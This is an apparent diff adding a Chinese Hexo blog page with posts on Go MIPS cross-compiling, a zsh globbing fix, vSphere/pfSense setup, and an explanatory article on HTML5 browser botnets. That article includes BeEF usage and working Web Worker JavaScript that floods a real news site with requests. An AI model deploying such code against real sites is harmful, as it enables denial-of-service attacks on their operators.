+<p>重要的是最后一行，应该是嵌入C语言的配置。</p>
+<h1 id="0x03-过程"><a href="#0x03-过程" class="headerlink" title="0x03 过程"></a>0x03 过程</h1><p>直接摘抄jacle169的过程，但是填了我遇到坑。我配置时候的过程也差不多，除了GO项目放置的位置不一样。</p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//下载go-mips32源 </span><br><span class="line">git <span class="built_in">clone</span> https://github.com/gomini/go-mips32.git </span><br><span class="line"><span class="built_in">cd</span> go-mips32/src</span><br><span class="line"></span><br><span class="line">//配置GO编译参数 </span><br><span class="line"><span class="built_in">export</span> GOOS=linux </span><br><span class="line"><span class="built_in">export</span> GOARCH=mips32le &lt;== Change to mips32 <span class="keyword">if</span> mips</span><br><span class="line"><span class="built_in">export</span> CGO_ENABLED=0</span><br><span class="line"></span><br><span class="line">//执行编译</span><br><span class="line">./make.bash </span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">//创建编译后文件存放文件夹 </span><br><span class="line">sudo mkdir /opt/mipsgo</span><br><span class="line">//复制 </span><br><span class="line">sudo cp -R * /opt/mipsgo</span><br><span class="line">//go工程参数配置 </span><br><span class="line"><span class="built_in">export</span> GOROOT=/opt/mipsgo </span><br><span class="line"><span class="built_in">export</span> PATH=/opt/mipsgo/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line">3.编译go程序作为测试</span><br><span class="line">mkdir /opt/slu</span><br><span class="line"><span class="built_in">cd</span> /opt/slu</span><br><span class="line">vim main.go</span><br></pre></td></tr></table></figure>
+
+<p>main.go — helloworld源码：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">       fmt.Println(<span class="string">&quot;hello icoolpy.com&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其实配置GO编译参数的三行export可以在终端显式运行，也就是在进行源码编译时：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GOOS=linux GOARCH=mips32le CGO_ENABLED=0 ./make.bash</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x04-测试"><a href="#0x04-测试" class="headerlink" title="0x04 测试"></a>0x04 测试</h1><p><img src="/img/2018/02/go-mips32-test.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/09/06/2017/zsh_no_match_found-09-06/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/09/06/2017/zsh_no_match_found-09-06/" class="post-title-link" itemprop="url">zsh的坑</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2017-09-06 00:24:02 / Modified: 00:51:40" itemprop="dateCreated datePublished" datetime="2017-09-06T00:24:02+08:00">2017-09-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%BE%AE%E5%9E%8Bblog/" itemprop="url" rel="index"><span itemprop="name">微型blog</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="深夜发牢骚"><a href="#深夜发牢骚" class="headerlink" title="深夜发牢骚"></a>深夜发牢骚</h2><p><img src="/img/2017/09/zsh/1.png"></p>
+<p>还是因为对自己不自信吧，以为自己敲的命令是错的。</p>
+<p>事件的起因是ipv6。我经常用scp，ssh，但是scp的时候ipv6的地址会报错，一看是因为冒号太多了，识别不了，可以理解。然后google了一下解决办法是加方括号把ipv6地址括起来，试了一下，还是报错<code>no matches found</code>，当时我的内心是这样的：卧槽，scp连ipv6地址都不支持还搞毛线。</p>
+<p>今天又试了一下（确切说是昨天），不是scp的命令了。</p>
+<p>想用ssh本地端口转发，又不行了。这回完全是刚才的图了。</p>
+<p>想想自己也是很蠢的，都没有把这个错误关键字Google一下，刚才一查直接就查到了是zsh的问题。</p>
+<p>终端要炫酷，肯定要用zsh的嘛。。。不过居然是zsh不兼容的问题，我也是服。</p>
+<p>换成bash来执行就完全没问题了。</p>
+<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>在~/.zshrc文件中加入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setopt nonomatch</span><br></pre></td></tr></table></figure>
+
+<p>然后命令行输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure>
+
+<p>就没问题了。</p>
+<p>初步看了一下问题，主要是zsh会自动解析命令中的东西，我还不知道这有啥用，可能在某些我不知道的方面是有用的吧。</p>
+<p>实在是个坑（当我知道是zsh的问题的时候的心情无法用语言来形容）。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/09/01/2016/%E6%B5%85%E8%B0%88Web%E5%89%8D%E7%AB%AF%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/09/01/2016/%E6%B5%85%E8%B0%88Web%E5%89%8D%E7%AB%AF%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/" class="post-title-link" itemprop="url">浅谈Web前端僵尸网络</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2017-09-01 13:34:20 / Modified: 13:34:56" itemprop="dateCreated datePublished" datetime="2017-09-01T13:34:20+08:00">2017-09-01</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
+<p>转载自<a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/network/120749.html">Freebuf</a>，虽然原作者就是我。。</p>
+</blockquote>
+<h1 id="Web前端僵尸网络的基本原理"><a href="#Web前端僵尸网络的基本原理" class="headerlink" title="Web前端僵尸网络的基本原理"></a>Web前端僵尸网络的基本原理</h1><p>僵尸网络（Botnet）已出现多年，对网络安全构成了巨大的挑站。随着攻防技术的发展，除了基于PC和服务器的传统僵尸网络，近年来，还出现了多种形态的僵尸网络，如基于智能手机、IOT设备或者Webshell等等的新型僵尸网络。</p>
+<p>除此之外，本文将介绍一种<a href="">基于Web前端的僵尸网络</a>。在新的HTML5标准越来越广泛地被使用之后，HTML5的强大功能为构建僵尸网络提供了可能性。由于这种僵尸网络基于支持HTML5的Web前端浏览器，所以其权限很低。不过，基于Web前端的僵尸网络至少可以用作DDOS攻击，如果处理得当，也可以用作对HTTP服务器进行扫描等操作。</p>
+<p>下面是本文总结的Web前端僵尸网络的技术基础：</p>
+<p>1、HTML5 新增技术——Web Worker技术。这是一种多线程机制，使得浏览器可以在不影响用户操作的同时处理其他事务，这为恶意的JS脚本提供了异步环境；</p>
+<p>2、HTML5 新增机制——跨域资源共享机制（CORS）。CORS处理机制工作在浏览器层面，如果服务器不允许跨站，浏览器将拦截服务器返回的结果。也就是说即使是跨域请求，服务器也同样会处理，并正常返回请求的资源。这个技术本身其实不对僵尸网络构成支持，但是HTML5支持CORS机制之后并未禁止跨域发送请求，这就成了前端僵尸网络立足的关键；</p>
+<p>3、Web蠕虫。类似于传统的蠕虫病毒，Web蠕虫使前端僵尸网络可以自行传播，结合Web蠕虫，前端僵尸网络可以相对容易地形成规模。</p>
+<p>以上三个技术点，合成在一起，为僵尸网络的存在提供了基本条件。下面进行详细介绍。</p>
+<h2 id="Web-Worker"><a href="#Web-Worker" class="headerlink" title="Web Worker"></a>Web Worker</h2><p>Web Worker 是运行在后台的 Javascript，独立于其他脚本，不会影响页面的性能。下面简单列举一下Web Worker能够做什么。</p>
+<ol>
+<li><p>   可以加载一个JS进行大量的复杂计算而不挂起主进程，用户可以在Worker运行期间做点击、选取内容等等任何事情；</p>
+</li>
+<li><p>   可以通过postMessage，onmessage方法进行线程通信；</p>
+</li>
+<li><p>   可以在Worker中通过importScripts(url)加载另外的脚本文件；</p>
+</li>
+<li><p>   可以使用 setTimeout，clearTimeout，setInterval，clearInterval等方法；</p>
+</li>
+<li><p>   可以使用XMLHttpRequest来发送请求，以及访问navigator的部分属性。</p>
+</li>
+</ol>
+<p>Web Worker增强了浏览器的能力。功能强大了，危险性也随之增大了。</p>
+<h2 id="CORS跨域资源共享机制"><a href="#CORS跨域资源共享机制" class="headerlink" title="CORS跨域资源共享机制"></a>CORS跨域资源共享机制</h2><p>跨域HTTP请求(Cross-site HTTP request)是一类相对特殊的浏览器请求，这种请求不是浏览器向在本页面为它提供资源的域名发起的，而是浏览器向其他的域名发起的。CORS机制可以让Web应用服务器能支持跨站访问控制，从而使得安全地进行跨站数据传输成为可能。</p>
+<p>很多文章和资料对CORS机制内部工作原理解释的不够清楚，导致本人一度以为CORS是在跨域请求发出时拦截或者在服务器层次禁止了资源的返回。然而实际上CORS安全机制并没有针对服务器提供任何保护。</p>
+<p>本文只针对XMLHttpRequest总结以下几点：</p>
+<ol>
+<li><p>   XMLHttpRequest请求可以发送到跨域服务器；</p>
+</li>
+<li><p>   跨域服务器会对之前的XMLHttpRequest做出响应；</p>
+</li>
+<li><p>   跨域服务器对XMLHttpRequest的响应和正常访问这个服务器产生的响应没有任何区别；</p>
+</li>
+<li><p>   未能加载服务器资源的原因是浏览器对跨域资源做出了拦截限制。</p>
+</li>
+</ol>
+<p>因此，对于服务器来说，假设有10000个XMLHttpRequest同时对某资源发出请求，以上的请求与10000个用户同时用浏览器正常访问这个资源是等价的，因为都要做同样的处理，都要返回同样的内容。这也就是说，使用Web Worker和XMLHttpRequest进行DDOS攻击是可行的。</p>
+<h2 id="Web蠕虫"><a href="#Web蠕虫" class="headerlink" title="Web蠕虫"></a>Web蠕虫</h2><p>Web蠕虫是Web前端僵尸自行传播的方法。这种机制利用的是传统前端漏洞，例如XSS漏洞。</p>
+<p><img src="/img/2016/clip_image001.png" alt="img"></p>
+<p>本文没有尝试实现僵尸节点（Web前端）和控制端的交互，这需要更复杂的JS代码，顺便提一下已经实现此类功能的BeEF XSS框架。</p>
+<p>这个框架很流行，集成了很多功能，甚至能够结合MSF使用。但是这些不在本文的探究范围之内。本文只对这个框架控制端和僵尸节点的交互进行演示。</p>
+<p>Kali Linux系统中集成了这个工具，本文用Kali Linux虚拟机进行演示。</p>
+<p>打开BeEF框架之后如图所示，不要关闭这个终端，等待程序加载完成后，一般情况下浏览器会弹出，如果没有弹出，打开浏览器手动输入终端中显示的UI URL。 </p>
+<p><img src="/img/2016/clip_image003.png" alt="img"></p>
+<p>默认的用户名和密码都是beef。登录成功后的页面如下：</p>
+<p><img src="/img/2016/clip_image005.png" alt="img"></p>
+<p>首页上有一些被植入恶意Javascript的Demo。为了演示的方便，使用实体机的Safari浏览器进行访问，将会在左侧显示信息。接下来按照下图点击到如下页面。</p>
+<p><img src="/img/2016/clip_image007.png" alt="img"></p>
+<p>点击红色圆圈中的Execute之后，将会在用户浏览器执行上面方框中输入的Javascript代码，给用户的浏览器弹出一个对话框，下图是实体机的Safari浏览器中的效果：</p>
+<p><img src="/img/2016/clip_image009.png" alt="img"></p>
+<p>通过这种方式，就可以在用户的浏览器中执行控制端需要僵尸节点执行的代码。有兴趣的朋友可以去读一下BeEF框架中hook.js文件源代码，应该会有很多启发。</p>
+<h1 id="僵尸网络节点代码测试（源代码根据《Web前端黑客技术揭秘一书》实例修改）"><a href="#僵尸网络节点代码测试（源代码根据《Web前端黑客技术揭秘一书》实例修改）" class="headerlink" title="僵尸网络节点代码测试（源代码根据《Web前端黑客技术揭秘一书》实例修改）"></a>僵尸网络节点代码测试（源代码根据《Web前端黑客技术揭秘一书》实例修改）</h1><p>测试的思路是：植入恶意Javascript代码，批量对某网站发送100次XMLHttpRequest，此次尝试的对象是腾讯的网站，因为单个节点的100次请求肯定对腾讯服务器无影响。攻击url为：<a target="_blank" rel="noopener" href="http://news.qq.com/photo.shtml">http://news.qq.com/photo.shtml</a>，用户访问的url为：<a target="_blank" rel="noopener" href="http://localhost/botnet/index.html">http://localhost/botnet/index.html</a>，测试代码见附录。</p>
+<p>通过Wireshark和chrome浏览器network开发者工具对测试结果进行分析：</p>
+<p>Wireshark抓到的tcp流：</p>
+<p><img src="/img/2016/clip_image011.png" alt="img"></p>
+<p>详细查看Response：</p>
+<p><img src="/img/2016/clip_image013.png" alt="img"></p>
+<p>Chrome：</p>
+<p><img src="/img/2016/clip_image015.png" alt="img"></p>
+<p><img src="/img/2016/clip_image017.png" alt="img"></p>
+<p>可以看到，Wireshark抓到了Response是有资源数据的，但是Chrome中得到的只有服务器返回的状态信息，这是CORS机制在浏览器层次对于跨域资源做了限制。</p>
+<p>但是，Wireshark抓包得到的数据可以证明服务器实实在在地对每个请求都做出了正常的响应。当这样的僵尸节点数目和Web Worker并发数目都增大到一定的等级，理论上就可以形成强大的DDOS攻击了。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>HTML5时代的Web前端已经不再那么简单。支持HTML5的浏览器，给了僵尸网络足够的生存空间。</p>
+<h1 id="附录：测试代码（根据《Web前端黑客技术揭秘》示例代码修改）"><a href="#附录：测试代码（根据《Web前端黑客技术揭秘》示例代码修改）" class="headerlink" title="附录：测试代码（根据《Web前端黑客技术揭秘》示例代码修改）"></a>附录：测试代码（根据《Web前端黑客技术揭秘》示例代码修改）</h1><h2 id="run-worker-js"><a href="#run-worker-js" class="headerlink" title="run_worker.js:"></a>run_worker.js:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">var worker_loc= &#x27;worker.js&#x27;;</span><br><span class="line"></span><br><span class="line">var workers = new Array();</span><br><span class="line"></span><br><span class="line">var i = 0;</span><br><span class="line"></span><br><span class="line">var noWorker = typeof Worker ==&quot;undefined&quot; ? true : false;</span><br><span class="line"></span><br><span class="line">var target = &#x27;http://news.qq.com/photo.shtml&#x27;</span><br><span class="line"></span><br><span class="line">if (!noWorker) &#123;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line"></span><br><span class="line">        for(i = 0; i &lt; 1; i++) &#123;</span><br><span class="line"></span><br><span class="line">           workers[i] = new Worker(worker_loc);</span><br><span class="line"></span><br><span class="line">           workers[i].postMessage(target);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    catch(e) &#123;</span><br><span class="line"></span><br><span class="line">       //comment out in release</span><br><span class="line"></span><br><span class="line">        e =e + &quot;&quot;;</span><br><span class="line"></span><br><span class="line">        if(e.indexOf(&quot;Worker is not enabled&quot;) != -1) &#123;</span><br><span class="line"></span><br><span class="line">           noWorker = true;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​       当浏览器支持Web Worker的时候，就会根据代码循环建立Worker。利用new worker(worker_loc)方式，创建Worker对象，并利用Worker的postMessage方法向worker发送指令等数据。多个Worker可以实现并发。但是本例只建立了一个Worker。</p>
+<h2 id="worker-js"><a href="#worker-js" class="headerlink" title="worker.js:"></a>worker.js:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">function makeRequest(base) &#123;</span><br><span class="line"></span><br><span class="line">    varfullUrl = base</span><br><span class="line"></span><br><span class="line">    varhttpRequest = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">   httpRequest.open(&quot;GET&quot;, fullUrl, true);</span><br><span class="line"></span><br><span class="line">   httpRequest.send(null);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function dos(base) &#123;</span><br><span class="line"></span><br><span class="line">    var i =0;</span><br><span class="line"></span><br><span class="line">    for (i= 0; i &lt; 100; i++) &#123;</span><br><span class="line"></span><br><span class="line">       console.log(base);</span><br><span class="line"></span><br><span class="line">       makeRequest(base);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">self.onmessage = function (e) &#123;</span><br><span class="line"></span><br><span class="line">    base =e.data;</span><br><span class="line"></span><br><span class="line">   dos(base);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Web Worker可以使用XMLHttpRequest发送跨域请求。这个函数可以使用GET和POST两种方法，一般使用GET方法就可以了，但是POST方法不限制发送长度和字符，有些情况必须要用POST方法。本例中采用GET方法测试。</p>
+<h2 id="index-html"><a href="#index-html" class="headerlink" title="index.html:"></a>index.html:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line"></span><br><span class="line">    #page&#123;width: 100%; height: 100%;&#125;</span><br><span class="line"></span><br><span class="line">   body&#123;margin:0&#125;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line"></span><br><span class="line">    varworker_loc = &#x27;worker.js&#x27;;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;run_worker.js&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe id=&quot;page&quot;name=&quot;page&quot; src=&quot;http://www.example.com&quot; frameborder=</span><br><span class="line"></span><br><span class="line">&quot;0&quot;noresize=&quot;noresize&quot;style=&quot;overflow:visible&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<p>index.html几乎没有更改，因为这个网页的内容对恶意javascript的测试没有影响。</p>
+<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>其实在这里写一遍就想补充一下。</p>
+<p>的确，利用XSS蠕虫弄一个门户网站估计费劲不说也会马上被修复，但是，仔细想想，好像有不用XSS就产生了很大效果的事件吧。</p>
+<p>补充到此结束。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/08/31/2017/vsphere_pfsense_2017-08-31/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/08/31/2017/vsphere_pfsense_2017-08-31/" class="post-title-link" itemprop="url">vSphere + pfSense 虚拟化服务器</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-08-31 23:04:02" itemprop="dateCreated datePublished" datetime="2017-08-31T23:04:02+08:00">2017-08-31</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-04-18 13:21:30" itemprop="dateModified" datetime="2019-04-18T13:21:30+08:00">2019-04-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%97%A0%E8%81%8A%E6%8A%98%E8%85%BE/" itemprop="url" rel="index"><span itemprop="name">无聊折腾</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="vSphere-ESXi"><a href="#vSphere-ESXi" class="headerlink" title="vSphere ESXi"></a>vSphere ESXi</h2><p><a target="_blank" rel="noopener" href="https://www.vmware.com/products/esxi-and-esx.html">vSphere ESXi</a>是VMware公司的服务器系统，老版本的vSphere ESX是基于Red Hat Linux的服务器控制平台，而新版本的ESXi直接在VMkernel上运行，一个vSphere ESXi 6.0.0系统的镜像大小缩小为375MB左右。</p>
+<p>为服务器安装vSphere ESXi系统时可以采用平时装机常用烧USB的方式，不过前提是对服务器比较熟悉，如果是新服务器还需要配置虚拟存储器，如果插了很多块硬盘可能会有分区等操作。</p>
+<p>另外，U盘启动之前，启动模式要调成EFI模式，不能用BIOS模式，否则会出现坑，坑长这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Loading /tboot.b00</span><br><span class="line">Loading /b.b00</span><br><span class="line">Loading /useropts.gz</span><br><span class="line">Loading /k.b00</span><br><span class="line">Loading /a.b00</span><br><span class="line">Loading /ata-pata.v00</span><br><span class="line">Loading /ata-pata.v01</span><br><span class="line">Loading /ata-pata.v02</span><br><span class="line">Loading /ata-pata.v03</span><br><span class="line">Loading /ata-pata.v04</span><br><span class="line">Loading /ata-pata.v05</span><br><span class="line">Error loading /ata-pata.v05</span><br><span class="line">Fatal error: 6 (Buffer too small)</span><br></pre></td></tr></table></figure>
+
+<p>坑跳过去基本就没事了。</p>
+<p><img src="/img/2017/08/vsphere/11.jpg"></p>
+<p>如果是接到家里路由器上的话，给服务器配个静态IP地址，然后用客户端连接就可以了。客户端和服务器之间通过https进行通信，不过ESXi的一个非常坑爹的特点是不支持NAT，只有类似于我们在VMware Workstation里边的桥接模式，但是很多时候我们有这方面的需求。</p>
+<p>当然了，如果是在家连个路由器用的话，大可不必折腾后边的pfSense软路由了。虚拟机网络直接桥接，无非是路由器多分配几个IP地址而已。</p>
+<h2 id="pfSense软路由"><a href="#pfSense软路由" class="headerlink" title="pfSense软路由"></a>pfSense软路由</h2><p>本次实验环境搭建的情景是这样的：一台服务器有N个虚拟机需要联网，但是IP地址只有两个。</p>
+<p>其实也可以只有一个IP地址，将pfSense作为路由器，这样的方式一般在自己家里和学校的实验室比较常见，只有一个PPPOE账号，也就只有一个IP地址，或者教育网内的网口，不允许申请多个IP的那种。个人觉得这种方式的重量级，虽然比起买个小型路由器大了很多，但是在N人共用一个路由器，需要很大NAT转发能力的情况下，用服务器取代小型家用路由器，也是一个不错的选择（经费足够的情况下）。毕竟服务器的运算速度和内存是嵌入式设备不能比的。</p>
+<p>不过一个IP地址，在刚才的情况系可能还是需要外接一个WIFI无线网卡（否则网线不够插的啊）。</p>
+<p>其他的情景应该也有很多吧，比如作为大一点的网关什么的，我猜的。。</p>
+<p>没试过只有一个IP地址的，就不多说了，两个IP地址就好整多了，假设只有两个ip地址<code>10.10.10.10</code>和<code>10.10.10.11</code>，配置好后大概的结构是这样的：</p>
+<p>服务器IP地址 ：<code>10.10.10.10</code></p>
+<p>pfSense WAN:  <code>10.10.10.11</code></p>
+<p>pfSense LAN : <code>192.168.1.1</code></p>
+<p><a target="_blank" rel="noopener" href="https://www.pfsense.org/">pfSense</a>是一款基于FreeBSD做的操作系统，可以安装在物理机或者虚拟机上，提供Web界面进行配置，用处广泛，可以给防火墙，路由器以及VPN路由等使用。</p>
+<p><img src="/img/2017/08/vsphere/2.png"></p>
+<p>这次实验是将pfSense安装在虚拟机里，所以才叫做“软路由”。</p>
+<h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><p>前边给服务器安装vSphere ESXi的过程就不写了。</p>
+<p>ESXi系统搭建好，并配好IP地址<code>10.10.10.10</code>。另外需要一台能访问这个ip地址的电脑，暂时将这台电脑的IP地址算做是<code>10.10.10.9</code>好了，这个不影响，只要能访问到就行。</p>
